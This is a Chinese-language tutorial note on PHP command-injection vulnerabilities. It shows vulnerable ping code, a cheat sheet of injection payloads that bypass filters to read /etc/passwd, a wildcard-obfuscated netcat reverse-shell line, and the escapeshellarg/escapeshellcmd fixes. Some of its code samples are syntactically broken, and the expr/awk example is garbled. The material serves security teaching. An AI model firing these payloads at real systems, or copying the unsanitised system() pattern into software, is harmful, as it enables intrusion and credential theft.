# PHP命令执行漏洞
应用程序的某些功能需要调用可以执行系统命令的[PHP命令执行函数](PHP命令执行函数.md)，如果这些函数或者函数的参数被用户控制，就有可能通过命令连接符拼接到正常的函数中，从而任意执行系统命令。

## Windows下的命令执行漏洞
Windows下的命令连接符[Windows连接符](Windows连接符.md)包括&、&&、|、||

代码示例：
```
<?php
	$ip=$_GET['ip'];
	system["ping".$ip];
?>
```

利用方法：
`cmd.php?ip=120.0.0.1|whoami`

## Linux下的命令执行漏洞
Linux下的命令连接符[Linux连接符](Linux连接符.md)包括 ;、&、&&、|、||

代码示例：
```
<?php
	$ip=$_GET['ip'];
	system["ping -c 3".$ip];
?>
```

利用方法：
`cmd.php?ip=120.0.0.1;whoami`

# 命令执行绕过
## 绕过空格过滤

1. \${IFS} 绕过
\$IFS 是shell的特殊环境变量，是Linux下的内部分隔符。\$IFS中存储的值可以是空格、制表符、换行符或者起他的自定义符号。
`cmd.php?ip=127.0.0.1;cat${IFS}/etc/passwd`

2. \$IFS\$9 绕过
空格过滤可以使用 \$IFS\$9 绕过
`cmd.php?ip=127.0.0.1;cat$IFS$9/etc/passwd`

3. 制表符绕过
%09是制表符的URL编码，可以绕过空格过滤
`cmd.php?ip=127.0.0.1;cat%09/etc/passwd`

4. {} 绕过
空格过滤可以使用 {} 绕过
`cmd.php?ip=127.0.0.1;{cat,/etc/passwd}`

5. \< 过滤
空格过滤可以使用 \< 绕过
`cmd.php?ip=127.0.0.1;cat</etc/passwd`

## 绕过关键字过滤
 
 1. 变量拼接过滤
Linux支持变量赋值，可以通过变量拼接来绕过过滤规则
`cmd.php?ip=127.0.0.1;$a=c;$b=at;$a$b/etc/passwd`

 2. 空变量绕过
`cmd.php?ip=127.0.0.1;ca${x}t /etc/passwd`

 3.  系统变量绕过
${SHELLOPTS}是系统变量，可以利用系统变量的字符拼接绕过过滤
```
# echo ${SHELLOPTS}
# braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
```
截取字符拼接：
`cmd.php?ip=127.0.0.1;${SHELLOPTS:3:1}at /etc/passwd`

 4. \\绕过
`cmd.php?ip=127.0.0.1;c\a\t /etc/passwd`

 5. 通配符绕过
`cmd.php?ip=127.0.0.1;cat /？？？/？？？sw？`

 6. shell反弹绕过
将IP 192.168.91.131 转为十进制：3232258947
然后通过通配符替换关键字：
``/b??/?c 3232258947 8888 -e /???/b？？h``

 7. Base64编码绕过
```cmd.php?ip=127.0.0.1;`echo "aWQ="|base64 -d` ```

 8. expr和awk绕过
通过expr和awk命令从其他文件这获取字符并进行命令构造
例如获取`www.ctfs-wiki.com`的第一个字符w：
``expr $substr$(awk=1 ctfs-wiki) 1 1``

 9. 无回显的命令执行可通过反弹shell或者DNS管道解析

# 漏洞修复
1. escapeshellarg函数
(PHP 4 >= 4.0.3, PHP 5, PHP 7)
把字符串转码为可以在 shell 命令里使用的参数
``string escapeshellarg ( string $arg )``
escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符
概述：
* 确保用户只传递一个参数给命令
* 用户不能指定更多的参数一个
* 用户不能执行不同的命令

2. escashellcmd函数

(PHP 4, PHP 5, PHP 7)
shell 元字符转义
``string escapeshellcmd ( string $command )`` escapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\）会在以下字符之前插入：`` &#;`|*?~<>^()[]{}$, \x0A 和 \xFF；’ 和 "`` 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替
概述：
* 确保用户只执行一个命令
* 用户可以指定不限数量的参数
* 用户不能执行不同的命令

参考[利用/绕过escapeshellarg/escapeshellcmd函数_LYJ20010728的博客-CSDN博客](https://blog.csdn.net/LYJ20010728/article/details/116902085)
